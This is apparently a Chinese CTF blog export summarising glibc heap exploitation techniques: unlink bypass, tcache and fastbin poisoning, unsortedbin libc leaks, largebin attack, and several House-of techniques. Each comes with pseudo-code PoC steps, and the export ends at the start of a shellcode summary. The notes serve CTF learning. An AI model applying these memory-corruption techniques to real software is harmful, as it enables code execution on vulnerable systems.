<li><p>check <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      \</span><br><span class="line">    malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span><br><span class="line"></span><br><span class="line"><span class="comment">// 省流版: </span></span><br><span class="line"><span class="comment">// CUR 的 fd 指向的 chunk 的 bk 必须存的是 CUR 的地址</span></span><br><span class="line"><span class="comment">// CUR 的 bk 指向的 chunk 的 fd 必须存的是 CUR 的地址</span></span><br><span class="line"><span class="keyword">if</span> ( !( CUR.fd-&gt;bk == &amp;(CUR.prev_size) &amp;&amp; CUR.bk-&gt;fd == &amp;(CUR.prev_size) ) )</span><br><span class="line">    malloc_printerr(...)</span><br></pre></td></tr></table></figure></p></li>
<li><p>bypass <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 让 CUR 的 fd 和 bk 指针都指向 CUR 自己</span></span><br><span class="line">CUR.fd = &amp;(CUR.prev_size)</span><br><span class="line">CUR.bk = &amp;(CUR.prev_size)</span><br><span class="line"></span><br><span class="line"><span class="comment">// check 时</span></span><br><span class="line">CUR.fd-&gt;bk = (&amp;(CUR.prev_size))-&gt;bk = CUR</span><br><span class="line">CUR.bk-&gt;fd = (&amp;(CUR.prev_size))-&gt;fd = CUR</span><br><span class="line"></span><br><span class="line"><span class="comment">// unlink</span></span><br><span class="line">CUR.fd-&gt;bk = (&amp;(CUR.prev_size))-&gt;bk = &amp;(CUR.prev_size) + <span class="number">2</span>*SIZE</span><br><span class="line">CUR.bk-&gt;fd = (&amp;(CUR.prev_size))-&gt;fd = &amp;(CUR.prev_size) - <span class="number">3</span>*SIZE</span><br></pre></td></tr></table></figure> 这样虽然不能实现任意地址写，但是也可以让
CUR 的 fd 和 bk 指针指向不正确的位置</p></li>
</ol></li>
</ol>
<h1 id="series-of-bin">[7] Series of Bin</h1>
<h2 id="tcachebin">[7-1] Tcachebin</h2>
<h3 id="概述-3">[7-1-1] 概述</h3>
<ol type="1">
<li>Tcachebin 为 LIFO 单向链表，如下</li>
</ol>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Tcachebin</span>: (头节点)<span class="title function_">newest_chunk</span>(first out) -&gt; ... </span><br><span class="line">    ... -&gt; (尾节点)<span class="title function_">oldest_chunk</span>(last out)</span><br></pre></td></tr></table></figure>
<h3 id="leak">[7-1-2] Leak</h3>
<h3 id="write">[7-1-3] Write</h3>
<h4 id="uaf">[7-1-3-1] UAF</h4>
<blockquote>
<p>Libc: 2.26 - 2.31</p>
</blockquote>
<blockquote>
<p>应用条件:</p>
</blockquote>
<ol type="1">
<li>UAF</li>
</ol>
<blockquote>
<p>相关特性:</p>
</blockquote>
<ol type="1">
<li>Tcachebin 跟筛子没什么区别，通过 UAF 修改 newest_chunk 的 fd 指针为
Any address，再通过两次 malloc 就可以在 Any address 处申请到一个 chunk
供我们使用</li>
</ol>
<blockquote>
<p>POC:</p>
</blockquote>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> alloc(chunk0)</span><br><span class="line">   alloc(chunk1)</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> free(chunk0)</span><br><span class="line">   free(chunk1)</span><br><span class="line"><span class="comment"># 做完这一步，tcachebin[size]: chunk1 -&gt; chunk0</span></span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> edit(chunk1,payload=address_to_malloc) </span><br><span class="line"><span class="comment"># 做完这一步，tcachebin[size]: chunk1 -&gt; address_to_malloc</span></span><br><span class="line"></span><br><span class="line"><span class="number">4.</span> alloc(chunk2) <span class="comment"># chunk2 = chunk1</span></span><br><span class="line">   alloc(chunk3) <span class="comment"># chunk3 = address_to_malloc</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>例题:</p>
</blockquote>
<ol type="1">
<li><a href="">杭电hgame2024-week2 Elden Ring Ⅱ</a></li>
</ol>
<h4 id="stash-double-free">[7-1-3-2] Stash Double Free</h4>
<blockquote>
<p>Libc: 2.27 - 2.31</p>
</blockquote>
<blockquote>
<p>应用条件:</p>
</blockquote>
<ol type="1">
<li><p>7个 tcachebin chunk，2个 fastbin chunk，bins 构造完成后至少可以
alloc 10次</p></li>
<li><p>free 后还能再 free 同一个 chunk</p></li>
</ol>
<blockquote>
<p>相关特性:</p>
</blockquote>
<ol type="1">
<li><p>2.27之后，tcachebin 加入了 key 值检验，因此直接劫持 tcachebin
链比较困难(需要伪造 key 值)。</p></li>
<li><p>(具体是 stash 机制，我是按下面这样理解的)但当 tcachebin
某一条链的 chunk 全部取出，且对应大小的 fastbin 上仍有 chunk，ptmalloc
会将 fastbin 对应链上的全部 chunk 取出，并按 fastbin 顺序装载到
tcachebin 中。此时 ptmalloc 不会检测 fastbin 的全部 chunk 是否合法，并且
ptmalloc 还会为每个 chunk 构造合法 key 值，所以我们可以先劫持 fastbin
链，然后清空 tcachebin 后劫持 tcachebin 链。</p></li>
<li><p>在检查 key 值之后，从 tcachebin 中申请 chunk
的检测机制比较薄弱，不需要考虑 fd 指向的地址的 size 域是否合法</p></li>
</ol>
<blockquote>
<p>POC:</p>
</blockquote>
<ol type="1">
<li><p>申请9个同样大小的 chunk，依次释放，再释放一次 chunk7
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    alloc(i) <span class="comment"># 0-6 tcahcebin chunks || 7,8 fastbin chunks</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    free(i) </span><br><span class="line"></span><br><span class="line">free(<span class="number">7</span>) <span class="comment"># fastbin: chunk7 -&gt; chunk8 -&gt; chunk7</span></span><br></pre></td></tr></table></figure></p></li>
<li><p>申请7个 chunk，清空 tcachebin 链。再申请 chunk7，将 fastbin
中的所有 chunk 转移到 tcachebin 中. <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    alloc(i)</span><br><span class="line"></span><br><span class="line">alloc(idx=<span class="number">7</span>,content=address_to_alloc)</span><br><span class="line"><span class="comment"># 此时 tcachebin: chunk8 -&gt; chunk7 -&gt; address_to_alloc</span></span><br></pre></td></tr></table></figure></p></li>
<li><p>申请3个 chunk，此时我们就可以通过改变 chunk9 的值，来 write
任意位置了. <figure class="highlight py"><table><tr><td class="code"><pre><span class="line">alloc(<span class="number">8</span>)</span><br><span class="line">alloc(<span class="number">7</span>)</span><br><span class="line">alloc(<span class="number">9</span>,content=anything_to_write)</span><br></pre></td></tr></table></figure></p></li>
</ol>
<blockquote>
<p>例题:</p>
</blockquote>
<ol type="1">
<li><a href="">杭电hgame2024-week2 fastnote</a></li>
</ol>
<h2 id="fastbin">[7-2] Fastbin</h2>
<h3 id="概述-4">[7-2-1] 概述</h3>
<ol type="1">
<li>Fastbin 为 LIFO 单向链表，如下</li>
</ol>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="attr">fastbin</span>: (头节点)<span class="title function_">newest_chunk</span>(first out) -&gt; ... </span><br><span class="line">  ... -&gt; (尾节点)<span class="title function_">oldest_chunk</span>(last out)</span><br></pre></td></tr></table></figure>
<h3 id="leak-1">[7-2-2] Leak</h3>
<h3 id="write-1">[7-2-3] Write</h3>
<h4 id="double-free-1">[7-2-3-1] Double Free</h4>
<blockquote>
<p>Libc: 2.27之前</p>
</blockquote>
<blockquote>
<p>应用条件:</p>
</blockquote>
<ol type="1">
<li>free 后还能再 free 同一个 chunk</li>
</ol>
<blockquote>
<p>fastbin 相关特性:</p>
</blockquote>
<ol type="1">
<li><code>free</code>: 在 free chunk 到 fastbin 的过程中，会有以下
check：
<ol type="1">
<li>检测这个 chunk 和尾节点是否是同一个
chunk，如果是，则触发<code>Error in './vuln': double free or corruption (fasttop): 0x17170c0</code></li>
</ol></li>
<li><code>malloc</code>: 从 fastbin 申请 chunk 时，会有以下 check:
<ol type="1">
<li>检测这个 chunk 的 fd 指向的内存的 size 是否符合所属
fastbin，如果不属于，则触发<code>Error in './vuln': malloc(): memory corruption (fast): 0x7f4cf12d6afe</code></li>
</ol></li>
</ol>
<blockquote>
<p>POC:</p>
</blockquote>
<ol type="1">
<li><p>构建 fastbin: chunk1 -&gt; chunk2 -&gt; chunk1<br />
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">alloc(<span class="number">1</span>)</span><br><span class="line">alloc(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></p></li>
<li><p>malloc(chunk1)，同时修改 chunk1 的 fd, 此时 fastbin 中构造为
chunk2 -&gt; chunk1 -&gt; address（address 有如下选择）</p>
<ol type="1">
<li>libc.sym['__malloc_hook'] - 0x23 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line">pd = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x23</span></span><br><span class="line"><span class="comment"># 注意不要把 &#x27;\n&#x27; 也当做 payload 传过去了</span></span><br><span class="line">alloc(<span class="number">1</span>,payload=pd)</span><br></pre></td></tr></table></figure></li>
</ol></li>
<li><p>malloc(chunk2), malloc(chunk1) <figure class="highlight py"><table><tr><td class="code"><pre><span class="line">alloc(<span class="number">2</span>)</span><br><span class="line">alloc(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></p></li>
<li><p>malloc(address)，同时修改 address
处的内容，对应<code>'2.'</code>中的不同选择，有不同的填充方式</p>
<ol type="1">
<li>payload = b'a'*19 + one_gadget <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">mallochook-<span class="number">0x23</span>      prev_size      <span class="number">0x000000000000007f</span></span><br><span class="line">mallochook-<span class="number">0x13</span>  <span class="number">0x6161616161616161</span> <span class="number">0x6161616161616161</span></span><br><span class="line">mallochook-<span class="number">0x03</span>  0xXXXXXXXXXX616161 0x0000000000XXXXXX</span><br><span class="line">                            ^</span><br><span class="line">                            |</span><br><span class="line">                    正好是__malloc_hook的位置</span><br></pre></td></tr></table></figure></li>
</ol></li>
</ol>
<blockquote>
<p>例题</p>
</blockquote>
<ol type="1">
<li><p><a
href="https://heygap.github.io/2023/08/14/Pwn%20-%20Practice/#more">BUUCTF
babyheap_0ctf_2017</a></p></li>
<li><p><a href="">杭电hgame2024-week2 old_fastnote</a></p></li>
</ol>
<h2 id="unsortedbin">[7-3] Unsortedbin</h2>
<h3 id="leak-2">[7-3-1] leak</h3>
<blockquote>
<p>Libc: Any</p>
</blockquote>
<blockquote>
<p>应用条件:</p>
</blockquote>
<ol type="1">
<li><p>UAF</p></li>
<li><p>alloc 至少不会覆盖 bk</p></li>
</ol>
<p>当unsortedbin中有且仅有一个chunk时，</p>
<p>该chunk的fd和bk会指向 &amp;main_arena + 96，</p>
<p>貌似libc2.31是96，libc2.23是88，</p>
<p>具体做题用 pwndbg 看最低四位是 0x8 还是
0x0，0x8-&gt;88,0x0-&gt;96</p>
<p>而这个地址可以用ida查看对应libc的 malloc_trim 函数找到，从而帮助计算
libc_base.</p>
<p>当然这个地址也是 &amp;__malloc_hook + 0x10，具体看下面的代码注释.</p>
<p>如果我们把 unsortedbin 中唯一一个 chunk 记作 chunk0，则:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 内存中的 main_arena 地址，一般为0x7f...</span></span><br><span class="line">main_arena = chunk0.fd - <span class="number">0x60</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算 libc 基址:</span></span><br><span class="line"><span class="comment"># main_arena 在 libc 中的偏移，正好等于 </span></span><br><span class="line"><span class="comment"># __malloc_hook 的偏移 + 0x10。</span></span><br><span class="line"><span class="comment"># 即 &amp;main_arena = &amp;__malloc_hook + 0x10。</span></span><br><span class="line">libc_base = main_arena - (ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>).sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] + <span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 我们也可以直接用 IDA 打开 libc,</span></span><br><span class="line"><span class="comment"># 找到 __malloc_trim 函数,</span></span><br><span class="line"><span class="comment"># 直接在 22 行附近找到类似于</span></span><br><span class="line"><span class="comment"># _R15 = &amp;dword_1ECB80 的语句,</span></span><br><span class="line"><span class="comment"># 这里 main_arena 的偏移就是 0x1ECB80</span></span><br><span class="line">libc_base = main_arena - <span class="number">0x1ECB80</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>bypass</p>
</blockquote>
<ol type="1">
<li><code>ssize_t read(int fd, void *buf, size_t nbytes)</code>会用''填充不够
nbytes 的部分，因此我们在 <code>alloc</code> 或者 <code>edit</code>
的时候注意 nbytes = 0x08 即可，这样不会覆盖 bk 的 &amp;main_arena</li>
</ol>
<h3 id="write-2">[7-3-2] write</h3>
<h4 id="direct">[7-3-2-1] Direct</h4>
<blockquote>
<p>Libc: 2.23</p>
</blockquote>
<blockquote>
<p>相关特性:</p>
</blockquote>
<ol type="1">
<li>低 libc 版本的 unsortedbin 可以像 tcachebin
一样，通过伪造链来申请一个 fake_chunk</li>
</ol>
<blockquote>
<p>POC:</p>
</blockquote>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 初状态 unsortedbin --&gt; chunk_victim  </span></span><br><span class="line">&gt; 此时我们令chunk_victim.bk = fake_chunk_head</span><br><span class="line"></span><br><span class="line"><span class="comment"># 末状态 unsortedbin --&gt; chunk_victim --&gt; fake_chunk</span></span><br><span class="line">&gt; 连续申请两个chunk即可申请到fake_chunk</span><br></pre></td></tr></table></figure>
<h2 id="largebin-attack">[7-4] Largebin Attack</h2>
<h3 id="概述-5">[7-4-1] 概述</h3>
<p>Largebin 是 FIFO 的双向链表，chunk 结构为👇 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+-------------------------------------------------+</span><br><span class="line">|        prev_size       |      size       |0|0|1|| </span><br><span class="line">|------------------------|------------------------|</span><br><span class="line">|           fd           |           bk           |</span><br><span class="line">|------------------------|------------------------|</span><br><span class="line">|       fd_nextsize      |       bk_nextsize      |</span><br><span class="line">|------------------------|------------------------|</span><br><span class="line">|                    user_data                    |</span><br><span class="line">|                      . . .                      |</span><br><span class="line">+-------------------------------------------------+</span><br></pre></td></tr></table></figure></p>
<h3 id="leak-3">[7-4-2] leak</h3>
<h3 id="write-3">[7-4-3] write</h3>
<h4 id="对-libc-有要求">[7-4-3-1] 对 libc 有要求</h4>
<blockquote>
<p>libc: 2.30 及以前？</p>
</blockquote>
<h4 id="对-libc-没要求">[7-4-3-2] 对 libc 没要求</h4>
<blockquote>
<p>libc: Any</p>
</blockquote>
<p>概述：</p>
<p>通过修改 largebin 中的 bk_nextsize 为 target_addr - 0x20，可以在
target_addr 处写一个堆地址</p>
<p>POC： <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">alloc(<span class="number">0x500</span>)  <span class="comment">// chunk1</span></span><br><span class="line">alloc(<span class="number">0x10</span>)   <span class="comment">// gap1 防止合并</span></span><br><span class="line">alloc(<span class="number">0x510</span>)  <span class="comment">// chunk2</span></span><br><span class="line">alloc(<span class="number">0x10</span>)   <span class="comment">// gap2 防止合并</span></span><br><span class="line"><span class="built_in">free</span>(chunk1)  <span class="comment">// chunk1 进入 unsortedbin</span></span><br><span class="line">alloc(<span class="number">0x520</span>)  <span class="comment">// chunk1 进入 largebin</span></span><br><span class="line"><span class="built_in">free</span>(chunk2)  <span class="comment">// chunk2 进入 unsortedbin</span></span><br><span class="line">chunk1.bk_nextsize = target_addr - <span class="number">0x20</span> <span class="comment">// UAF等方法修改 chunk</span></span><br><span class="line">alloc(<span class="number">0x520</span>)  <span class="comment">// chunk2 进入 largebin，触发 largebin attack</span></span><br><span class="line">                        <span class="comment">// target_addr 处被写入 chunk2 的地址</span></span><br></pre></td></tr></table></figure></p>
<h1 id="series-of-house">[8] Series of House</h1>
<h2 id="house-of-orange">[8-1] House of Orange</h2>
<h3 id="概述-6">[8-1-1] 概述</h3>
<p>HouseofOrange是在程序没有可以操控的free时，利用ptmalloc的管理机制强行制造出一个unsortedbin中的chunk的技术。</p>
<h3 id="伪造chunk需求">[8-1-2] 伪造chunk需求</h3>
<ol type="1">
<li><p>top_chunk的结束地址必须页对齐</p>
<ul>
<li>一般情况下，ptmalloc设置top_chunk为0x21000，我们申请一个0x10的chunk0后，chunk0加上chunk_head是0x20大小，此时top_chunk切割后还剩下0x20fe0大小，为了页对齐，我们伪造top_chunk的大小为0xfe0即可</li>
</ul></li>
<li><p>top_chunk.size &gt;= MINSIZE</p></li>
<li><p>top_chunk.size &lt; chunk_size + MINSIZE</p></li>
<li><p>top_chunk.prev_inuse == 1</p>
<ul>
<li>第一点中说的0xfe0要变为0xfe1</li>
</ul></li>
</ol>
<h2 id="house-of-force-hof">[8-2] House of Force (HOF)</h2>
<h3 id="概述-7">[8-2-1] 概述</h3>
<p>House of Force 是通过 topchunk 来实现任意地址写的操作。</p>
<p>具体来说，我们先修改 topchunk 的 size 域，接着用 malloc(c_size) 从
topchunk 切割一个 chunkF，在切割前，通过构造 malloc chunkF 时的
c_size，能改变 main_arena 中指向 topchunk
的指针为任意值，从而在切割时能在任意地址申请一个
chunk，进而实现任意地址写。</p>
<h3 id="具体原理">[8-2-2] 具体原理</h3>
<ul>
<li><p>从 topchunk 申请 chunk
的具体实现是这样的，其中的代码可以这样理解(我没读源码，只是从应用角度逆推原理):</p>
<ul>
<li><p>⚠注：本段代码的数据全为 unsigned，也就是说，我们要申请的 chunk 的
size 即 nb 会被转化为无符号，topchunk 的 size 也是无符号的</p></li>
<li><p>victim: 获取指向目标 chunk 的指针，在这是 topchunk</p></li>
<li><p>chunksize(victim): 获取 victim 指向的 chunk 的大小</p></li>
<li><p>nb: chunk 的实际大小，malloc(size) 时 nb = request2size(size)
<code>这个地方我也没搞清楚，主要有的时候nextchunk的prev_size域也被拿来当作chunk的一部分，就导致我不是很清楚对齐这一块怎么做的，后面仔细读一下源码再来订正</code></p></li>
<li><p>chunk_at_offset(victim, nb): return(victim + nb)</p></li>
</ul></li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取当前的top chunk，并计算其对应的大小</span></span><br><span class="line">victim = av-&gt;top;</span><br><span class="line">size   = chunksize(victim);</span><br><span class="line"><span class="comment">// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE)) </span><br><span class="line">&#123;</span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    remainder      = chunk_at_offset(victim, nb);</span><br><span class="line">    av-&gt;top        = remainder;</span><br><span class="line">    set_head(victim, nb | PREV_INUSE |</span><br><span class="line">            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">    check_malloced_chunk(av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">    alloc_perturb(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>House of Force 逻辑如下：</p>
</blockquote>
<p>首先通过堆溢出之类的手段，改变 topchunk 的 size 域为
-1，即0xffffffffffffffff</p>
<p>在 <code>chunkFakealloc(size)</code> 时，通过构造
size（由于<code>nb = request2size(size)</code>,所以构造 nb
的本质就是构造 size），切割程序会运行到如下代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">remainder      = chunk_at_offset(victim, nb);</span><br><span class="line">av-&gt;top        = remainder;</span><br></pre></td></tr></table></figure>
<p>此时，remainder 会被赋值为 victim + nb，而下一行代码
<code>av-&gt;top = remainder</code> 使得 main_arena 中指向 topchunk
的指针被修改</p>
<p>值得注意的是，若 nb 为负数，victim + nb 会溢出，从而将 victim
修改为比 victim 自己指向的地址更低的地址。</p>
<p>也就是说，通过构造 nb，我们可以将 av-&gt;top 改写为
<code>Any Address</code></p>
<p>而通过再一次的 <code>chunkNewalloc(nb)</code>，我们就可以在
<code>Any Address</code> 处申请一个 chunk，进而实现任意地址写.</p>
<p>总而言之，在改变 topchunk 的 size 域为 -1 之后，只要我们能够精心构造
<code>malloc(nb)</code> 时的 nb，就可以实现任意地址写。</p>
<p>那么接下来的问题很显然，如何构造 nb ，也就是如何构造 size？</p>
<blockquote>
<p>size 的构造</p>
</blockquote>
<p>malloc 的过程中会遇到如下检查，<code>req</code>就是我们申请的 chunk
的大小，就是前文提到的 request2size的参数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// MINSIZE = 2 * SIZE_SZ</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REQUEST_OUT_OF_RANGE(req)                                              \</span></span><br><span class="line"><span class="meta">    ((unsigned long) (req) &gt;= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))</span></span><br></pre></td></tr></table></figure>
<p>其中，<code>SIZE_SZ</code> 在 64 位是 0x08，32 位为 0x04，因此
<code>MINSIZE</code> 在 64 位中是 0x10，32 位为 0x08</p>
<p>由于 -2 * MINSIZE 被转化为了无符号数，拿 64 位举例，req 很难超过
0xfffffffffffffff0
这么大的数字，所以这个检测是很好绕过的，或者说根本不用 care
这个检测。</p>
<p>接下来，<code>req</code>会经过如下函数，转化为要申请的 chunk 的 真实
size，也就是 nb</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> request2size(req)                                                      \</span></span><br><span class="line"><span class="meta">    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \</span></span><br><span class="line"><span class="meta">         ? MINSIZE                                                             \</span></span><br><span class="line"><span class="meta">         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span></span><br></pre></td></tr></table></figure>
<p>其中，<code>MALLOC_ALIGN_MASK</code> 在 64 位是 0xF 即 1111b，32位为
0x7 即 111b.</p>
<p><code>这里有点没想明白 request2size 的过程，我先假设在 malloc(size) 时，nb = request2size(req) = request2size(size)</code></p>
<p>由于 nb 都是对齐的，所以我们可以不用考虑
<code>&amp; ~MALLOC_ALIGN_MASK</code>，所以 size = req = nb - SIZE_SZ -
MALLOC_ALIGN_MASK</p>
<p>至此，我们构造出了 size，HOF结束.</p>
<h2 id="house-of-botcake">[8-3] House of botcake</h2>
<blockquote>
<p>libc: 2.29 -</p>
</blockquote>
<h3 id="概述-8">[8-3-1] 概述</h3>
<p>由于 libc 2.29 之后加入了 tcachebin 检查机制，所以 tcachebin double
free 变得没有那么好利用</p>
<p>但由于放入 unsortedbin 中的 chunk，再被 free 进 tcachebin
的时候检测相当薄弱</p>
<p>所以我们可以先把 chunk free 进 unsortedbin，再 free 进
tcachebin，当我们切割 unsortedbin 时就能修改 tcachebin 里重叠的 chunk 的
fd/bk，造成 tcachebin poisoning</p>
<h3 id="poc-1">[8-3-2] POC</h3>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    malloc(<span class="number">0x80</span>) <span class="comment"># idx0-6: tcache | idx7,8:unsorted</span></span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0x10</span>) <span class="comment"># idx9: 防止 unsortedbin 与 topchunk 合并</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i) <span class="comment"># idx0-6: tcache</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">7</span>) <span class="comment"># chunk7 后向合并 chunk8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 从 tcachebin[0x80] 取出一个 chunk，此时 tcachebin 链只剩六个 chunk</span></span><br><span class="line">malloc(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 把本在 unsortedbin 中的 chunk8 放入 tcachebin</span></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从 chunk7,8 切割，但实际上已经覆盖了 tcachebin chunk8 的 fd/bk 指针了</span></span><br><span class="line">malloc(<span class="number">0xa0</span>) </span><br></pre></td></tr></table></figure>
<h3 id="一些疑问">[8-3-3] 一些疑问</h3>
<p>不构造 chunk 7，直接把 chunk8 放进 unsortedbin 再放进 tcachebin
中是完全可行的，但当我切割 chunk8 时就会报错
<code>malloc(): unsorted double linked list corrupted\n</code></p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">tcachebins</span><br><span class="line"><span class="number">0x90</span> [  <span class="number">7</span>]: <span class="number">0x55dd5ca32690</span> —▸ <span class="number">0x55dd5ca32570</span> —▸ <span class="number">0x55dd5ca324e0</span> —▸ <span class="number">0x55dd5ca32450</span> —▸ <span class="number">0x55dd5ca323c0</span> —▸ <span class="number">0x55dd5ca32330</span> —▸ <span class="number">0x55dd5ca322a0</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">all [corrupted] <span class="comment">// 或许跟这里有关系？</span></span><br><span class="line"><span class="attr">FD</span>: <span class="number">0x55dd5ca32680</span> —▸ <span class="number">0x55dd5ca32570</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="attr">BK</span>: <span class="number">0x55dd5ca32680</span> —▸ <span class="number">0x55dd5ca32010</span> ◂— <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
<p>目前猜测是: 直接把 chunk8 放进 tcachebin 会导致原本存在 chunk8 fd/bk
处的 &amp;main_arena+88 被替换，导致 malloc 错误</p>
<h2 id="house-of-banana">[8-4] House of banana</h2>
<p>具体细节可以看这篇<a
href="https://www.secpulse.com/archives/180765.html">文章</a></p>
<h3 id="概述-9">[8-4-1] 概述</h3>
<p>当程序显式调用<code>exit()</code>函数时，程序会通过<code>exit -&gt; _dl_fini -&gt;((fini_t) array[i]) ()</code>这条调用链调用
<code>array[i]()</code>。</p>
<p>而 <code>array[i]()</code> 是通过
<code>_rtld_global._dl_ns._ns_loaded.l_next-&gt;l_next-&gt;l_next</code>
定位的</p>
<p>通过 largebin
attack，我们可以篡改<code>_rtld_global._dl_ns._ns_loaded.l_next-&gt;l_next-&gt;l_next</code>指针，将其值修改为我们可以控制的堆地址，</p>
<p>而通过在堆上伪造一个 link_map 结构体，我们可以欺骗程序，使其执行
<code>array[i]()</code> 时执行在结构体里放入的提权函数，进而提权</p>
<h3 id="poc-2">[8-4-2] POC</h3>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># largebin attack 修改 _rtld_global._dl_ns._ns_loaded.l_next-&gt;l_next-&gt;l_next</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造 fake chunk</span></span><br></pre></td></tr></table></figure>
<h3 id="如何构造-fake_chunk">[8-4-3] 如何构造 fake_chunk?</h3>
<p>见 <a
href="https://heygap.github.io/2024/02/15/Pwn%20-%20IO_File%20and%20ld.so%20exploit%20summary/#more">Pwn
- IO_File and ld.so exploit summary</a></p>
<h2 id="house-of-pig">[8-5] House of pig</h2>
<p>https://bbs.kanxue.com/thread-268245.htm#msg_header_h3_2</p>
]]></content>
      <categories>
        <category>CTF_Theory</category>
      </categories>
      <tags>
        <tag>Pwn</tag>
        <tag>Heap</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwn - Shellcode Summary</title>
    <url>/posts/47197.html</url>
    <content><![CDATA[<blockquote class="blockquote-center">
Shellcode 也是十分核心的技术🤔
</blockquote>
<span id="more"></span>
<h1 id="manual">Manual</h1>
<p><a
href="https://blog.csdn.net/qq_29343201/article/details/52209588">linux
系统调用号表</a></p>
<p><a href="https://docs.pwntools.com/en/stable/shellcraft.html">manual:
pwntools.shellcraft</a></p>
<h1 id="目录">[0] 目录</h1>
<ol type="1">
<li><a href="#1-编写-shellcode">编写 shellcode</a>
<ul>
<li><a href="#1-1-shellcode-板子">shellcode 板子</a></li>
<li><a href="#1-2-现有工具">现有工具</a></li>
<li><a href="#1-3-板子">板子</a></li>
</ul></li>
<li><a href="#2-shellcode-restrictions--bypass-限制与绕过">shellcode
restrictions &amp; bypass (限制与绕过)</a>
<ul>
<li><a href="#2-1-length-restrictions-长度约束">Length restrictions
(长度约束)</a></li>
<li><a href="#2-2-seccomp-禁用">seccomp 禁用</a></li>
<li><a href="#2-3-alphanumeric-shellcode-字母数字构成">alphanumeric
shellcode (字母+数字构成)</a></li>
</ul></li>
<li><a href="#3-例题">例题</a></li>
<li><a href="#4-参考资料">参考资料</a></li>
</ol>
<h1 id="编写-shellcode">[1] 编写 shellcode</h1>
<h2 id="shellcode-板子">[1-1] shellcode 板子</h2>
<ol type="1">
<li><p><a href="https://www.exploit-db.com/">exploit-db</a></p></li>
